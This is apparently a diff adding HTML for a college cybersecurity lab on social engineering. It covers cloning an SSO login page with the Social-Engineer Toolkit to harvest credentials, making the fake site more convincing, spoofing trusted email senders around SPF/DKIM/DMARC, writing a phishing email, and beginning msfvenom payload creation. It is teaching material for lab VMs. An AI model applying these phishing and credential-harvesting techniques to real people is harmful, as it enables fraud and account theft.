+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">The cloned website redirects to the real SSO login page after swiping the credentials.</span></p><br />
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;"><em>The user will assume they entered the wrong login, try again, and log in. Will they be suspicious? How many times have you entered the wrong password?</em></span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+
+    <!-- 1.5 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">1.5</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Upload the XML report that SET produces with all the stolen credentials. You'll need to stop the collection process via <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>CTRL-C</strong></span>.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 1.6 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="6">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">How can we make the out-of-the-box SET experience could be more convincing?</span></p>
+
+    <!-- 1.6 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">1.6</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Look at the URL of your cloned site: <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>http://192.168.1.x</strong></span>.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>i.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Is that IP address suitable for a real social engineering attack out across the Internet?</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>ii.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Try accessing it from your phone if you're unsure.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>iii.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Why doesn't it work?</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>iv.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">How might you solve the IP address issue in the previous question?</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Look at the URL of your cloned site again: <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>http://192.168.1.x</strong></span>.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>i.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">An ugly IP address.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>ii.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Even 25% of n00bs would notice that looks suspicious or unusual.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>iii.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">How do you think you could fix this problem?</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Look at the URL of your cloned site one last time: <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>http://192.168.1.x</strong></span>.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>i.</strong></span></td>
+          <td style="width: 89%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">The <em>http</em> protocol is not encrypted. Web browsers are increasingly assertive with labeling such pages as not secure with a variety of warning labels or icons.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>ii.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Maybe 15% of n00bs would notice that.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="3" style="width: 9%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>iii.</strong></span></td>
+          <td style="width: 89%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">How could you solve this problem for a cost of $0.00?</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+
+<!-- PART 2 -->
+<!-- <a href="##top8" style="color: #ba372a;">[TOP]</a> -->
+<hr />
+<p id="#eblast"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 2 - Email Blast</strong></span></p>
+
+<blockquote>
+  <p style="text-align: justify;">
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">To effectively entice victims to visit our cloned credential harvesting site, we must craft an email that appears both convincing and urgent, prompting recipients to take immediate action. Leveraging the Social-Engineer Toolkit's "Mass Mailer" module, or any analogous mass mailing tool, offers a means to disseminate these deceptive emails at scale. However, circumventing anti-spam technologies such as Sender Policy Framework (SPF) requires careful strategy.</span><br /><br />
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Firstly, the email's sender address should mimic that of a trusted source within the target organization, such as <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>ceo@company.com</strong></span> or <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>tech-support@company.com</strong></span>. While this impersonation enhances the email's credibility, it also raises the likelihood of encountering SPF restrictions and other filtering mechanisms.</span><br /><br />
+  </p>
+</blockquote>
+
+<!-- 2.1 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="1">
+  <li>
+    <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">To mitigate the risk of being flagged as spam, several tactics such as <strong>Sender Policy Framework (SPF)</strong> can be employed.</span></p><br />
+
+    <!-- 2.1 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">2.1</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Compose a comprehensive one-paragraph description of the Sender Policy Framework (SPF) <strong><em>in your own words, as if you were explaining it to another student</em></strong>.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Using any number of available websites, generate an SPF rule for the domain <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>company.com</strong></span>, specifying the IP address <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>181.67.42.18</strong></span> is allowed to send email for this domain, and also that host <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>gmail.com</strong></span> is also allowed to send email for this domain.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- NOTE BLUE -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #c2e0f4; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;">
+                <img src="https://web.acd.ccac.edu/~mkisow/assets/blue-note-22x22.svg"  width="22" height="22" style="border: 0px solid #000000;" alt="note"/>
+                <strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 14pt;">NOTE</span></strong></td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">There are other more detailed SPF options.</span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+
+    <!-- IMPORTANT PURPLE -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #eccafa; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #843fa1;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;">
+                <img src="https://web.acd.ccac.edu/~mkisow/assets/purple-important-24x21.svg"  style="border: 0px solid #000000;" height="21" width="24" alt="important"/>
+                <strong><span style="font-family: arial, helvetica, sans-serif; color: #843fa1; font-size: 14pt;">IMPORTANT</span></strong></td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #843fa1;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #843fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #843fa1; font-size: 12pt;">The SPF rule for <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>ccac.edu</strong></span> is <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>v=spf1 include:_spf.ccac.edu include:_tuf-spf.touchnet.com include:_spf.bbnotify.net include:_spf.mailgun.org include:spf.protection.outlook.com include:_spf.psm.knowbe4.com mx -all</strong></span></span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.2 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="2">
+  <li>
+    <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Another anti-spam technology is <strong>DomainKeys Identified Mail (DKIM)</strong>.</span></p><br />
+
+    <!-- 2.2 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">2.2</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Compose a comprehensive one-paragraph description of DomainKey Identified Mail (DKIM) <strong><em>in your own words, as if you were explaining it to another student</em></strong>.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.3 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="3">
+  <li>
+    <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">The final anti-spam technology is <strong>Domain-based Message Authentication, Reporting, and Conformance (DMARC)</strong> ; an anti-spam technology closely related to the first two.</span></p><br />
+
+    <!-- 2.3 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">2.3</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Compose a comprehensive one-paragraph description of Domain-based Message Authentication, Reporting, and Conformance (DMARC) <strong><em>in your own words, as if you were explaining it to another student</em></strong>.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Using your own personal email, create a high-quality phishing email that would plausibly induce a "typical college student" to click on a link and take some action. Send it to yourself to ensure it's correctly formatted. Then, save the email as a .html file and attach it here.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- NOTE BLUE -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #c2e0f4; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;"><img src="https://web.acd.ccac.edu/~mkisow/assets/blue-note-22x22.svg"  width="22" height="22" style="border: 0px solid #000000;" alt="note"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 14pt;">NOTE</span></strong></p>
+            </td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;">
+                <span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">None of these systems are guaranteed. The receiver of an email could choose to disregard these systems and deliver a fraudulent message anyway. Or, more likely, the receiver uses information from these systems as data points in a larger anti-spam system that examines the content of the message, the reputation of the server sending the email, the user history in flagging previous messages as spam, and <em>proprietary trade secrets built on decades of experience</em>, when deciding whether to deliver the message to a user inbox. Even new legitimate senders have significant challenges in reliably delivering emails to @gmail.com, @outlook.com, and other large mail services.</span><br /><br />
+                <span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">Because of these challenges, you'll often see phishing attacks from <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>ceo@fakecompany.com</strong></span>, <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>ceo-fakecompany@gmail.com</strong></span>, or <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>ceo@company.fake.com</strong></span>, as those are more likely to be delivered. Of course, if you already have some access to the corporate network after earlier pen testing activities, you could send emails out using the legitimate corporate email server. But that's a chicken and egg problem - oftentimes, you're using social engineering attacks to gain initial access to the network. </span>
+              </p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+    <p></p>
+  </li>
+</ol>
+
+
+<!-- PART 3 -->
+<!-- <a href="##top8" style="color: #ba372a;">[TOP]</a> -->
+<hr />
+<p id="#payload"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 3 - Payloads via msfvenom</strong></span></p>
+
+<blockquote>
+  <p style="text-align: justify;">
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Metasploit offers a powerful utility known as <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html" target="_blank" rel="noopener"><span style="color: #ba372a;"><strong>msfvenom</strong></span></a>, which enables the encapsulation of exploits into standalone executables. These executables can be disguised and distributed through social engineering tactics, exploiting human vulnerabilities rather than technical weaknesses. In a social engineering attack, unsuspecting users are manipulated into executing these seemingly harmless files, unwittingly triggering the embedded exploits. This capability magnifies the potential impact of cyber threats, as attackers can easily deploy malicious payloads across diverse systems, exploiting the trust and naivety of users to gain unauthorized access or execute malicious actions.</span>
+  </p>
+</blockquote>
+
+<!-- 3.1 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="1">
+  <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong> , create a stand-alone executable payload using <em>msvenom</em>.</span></p>
+    <ol style="list-style-type: lower-alpha;" start="a">
+
+      <!-- A -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">View a list of all available payloads in msvenom.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# msfvenom</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfvenom</span></span></strong>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- B -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">This is a <strong><em>long list</em></strong>, and it's the same list of available payloads that Metasploit normally has available to run after an exploit. This time no exploit are needed, since we're using social engineering to trick the user into running the payload for us.<br />To view the list of available output formats, CPU architectures, and platforms run the following commands:</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Formats, Architectures and Platforms</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfvenom</span> --list formats</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfvenom</span> --list archs</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfvenom</span> --list platforms</span></strong>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- C -->
